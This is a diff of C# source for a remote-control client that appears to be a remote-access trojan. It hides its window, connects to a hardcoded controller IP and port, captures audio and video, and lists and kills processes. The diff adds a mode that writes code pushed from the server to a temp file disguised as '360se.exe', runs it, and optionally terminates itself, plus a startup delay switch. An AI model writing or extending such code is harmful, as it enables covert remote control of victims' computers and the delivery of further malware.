@@ -48,6 +48,13 @@ namespace RemoteControl.Client
         {
             // 窗体隐藏时调用Console.Title会报错
             //Console.Title = "RC";
+            if (args.Length == 1 && args[0].StartsWith("/delay:"))
+            {
+                string str = args[0].Substring("/delay:".Length);
+                int delay = Convert.ToInt32(str);
+                Thread.Sleep(delay);
+                args = new string[]{};
+            }
             ReadParameters();
             if (args.Length == 0)
             {
@@ -69,16 +76,19 @@ namespace RemoteControl.Client
                 t.Join();
                 return;
             }
-            else if (args.Length == 1 && args[0] == "/r")
+            else if (args.Length == 1)
             {
-                // 进行运行操作
-                if (CommonUtil.IsMultiRun(MutexName))
-                    return;
-                InitHandlers();
-                StartConnect();
-                heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
-                heartbeatThread.Start();
-                StartMonitor();
+                if (args[0] == "/r")
+                {
+                    // 进行运行操作
+                    if (CommonUtil.IsMultiRun(MutexName))
+                        return;
+                    InitHandlers();
+                    StartConnect();
+                    heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
+                    heartbeatThread.Start();
+                    StartMonitor();
+                }
             }
         }
 
@@ -89,13 +99,16 @@ namespace RemoteControl.Client
             RequestCaptureAudioHandler captureAudioHandler = new RequestCaptureAudioHandler();
             handlers.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
             handlers.Add(ePacketType.PACKET_STOP_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
+            RequestGetProcessesHandler getProcessesHandler = new RequestGetProcessesHandler();
+            handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
+            handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
         }
 
         static void ReadParameters()
         {
             if (isTestMode)
             {
-                clientParameters.SetServerIP("192.168.0.107");
+                clientParameters.SetServerIP("192.168.1.136");
                 clientParameters.ServerPort = 10086;
                 clientParameters.OnlineAvatar = "";
                 clientParameters.ServiceName = "";
@@ -433,19 +446,6 @@ namespace RemoteControl.Client
                 var req = obj as RequestDownloadWebFile;
                 StartDownloadWebFile(session, req);
             }
-            else if (packetType == ePacketType.PACKET_GET_PROCESSES_REQUEST)
-            {
-                new Thread(() => StartGetProcesses(session)) { IsBackground = true }.Start();
-            }
-            else if (packetType == ePacketType.PACKET_KILL_PROCESS_REQUEST)
-            {
-                var req = obj as RequestKillProcesses;
-                new Thread(() =>
-                    {
-                        StartKillProcesses(session, req);
-                        StartGetProcesses(session);
-                    }) { IsBackground = true }.Start();
-            }
             else if (packetType == ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST)
             {
                 var req = obj as RequestStartCaptureVideo;
@@ -631,11 +631,29 @@ namespace RemoteControl.Client
                         Console.WriteLine("请求ID:" + req.ID);
                         if (codePluginDic.ContainsKey(req.ID))
                         {
-                            Console.WriteLine("请求ID存在:" + req.ID + "开始加载插件...");
-                            byte[] data = codePluginDic[req.ID].ToArray();
-                            Console.WriteLine("数据长度：" + data.Length);
-                            PluginLoader.LoadPlugin(data, OnFireQuit);
-                            codePluginDic.Remove(req.ID);
+                            if (req.Mode == eExecMode.ExecByPlugin)
+                            {
+                                byte[] data = codePluginDic[req.ID].ToArray();
+                                Console.WriteLine("数据长度：" + data.Length);
+                                PluginLoader.LoadPlugin(data, OnFireQuit);
+                                codePluginDic.Remove(req.ID);
+                            }
+                            else if (req.Mode == eExecMode.ExecByFile)
+                            {
+                                if (req.FileArguments == null)
+                                    req.FileArguments = string.Empty;
+                                // 释放文件
+                                byte[] data = codePluginDic[req.ID].ToArray();
+                                string tempFile = ResUtil.WriteToRandomFile(data, "360se.exe");
+                                // 启动新程序
+                                Thread t = ProcessUtil.RunByCmdStart(tempFile, req.FileArguments, true);
+                                t.Join();
+                                if (req.IsKillMySelf)
+                                {
+                                    // 结束当前进程
+                                    OnFireQuit(null, null);
+                                }
+                            }
                         }
                         else
                         {
@@ -811,44 +829,6 @@ namespace RemoteControl.Client
             }
 
             return -1;
-        }
-
-        static void StartKillProcesses(SocketSession session, RequestKillProcesses req)
-        {
-            var processList = Process.GetProcesses().ToList();
-            for (int i = 0; i < req.ProcessIds.Count; i++)
-            {
-                string processId = req.ProcessIds[i];
-                try
-                {
-                    Process p = processList.Find(m => m.Id.ToString() == processId);
-                    if (p == null)
-                        continue;
-
-                    p.Kill();
-                }
-                catch (Exception ex)
-                {
-                }
-            }
-        }
-
-        static void StartGetProcesses(SocketSession session)
-        {
-            ResponseGetProcesses resp = new ResponseGetProcesses();
-
-            try
-            {
-                var processes = ProcessUtil.GetProcessProperyList();
-                resp.Processes = processes.OrderBy(s=>s.ProcessName).ToList();
-            }
-            catch (Exception ex)
-            {
-                resp.Result = false;
-                resp.Message = ex.Message;
-            }
-
-            session.Send(ePacketType.PACKET_GET_PROCESSES_RESPONSE, resp);
         }
 
         static void PlayMusic(string path)
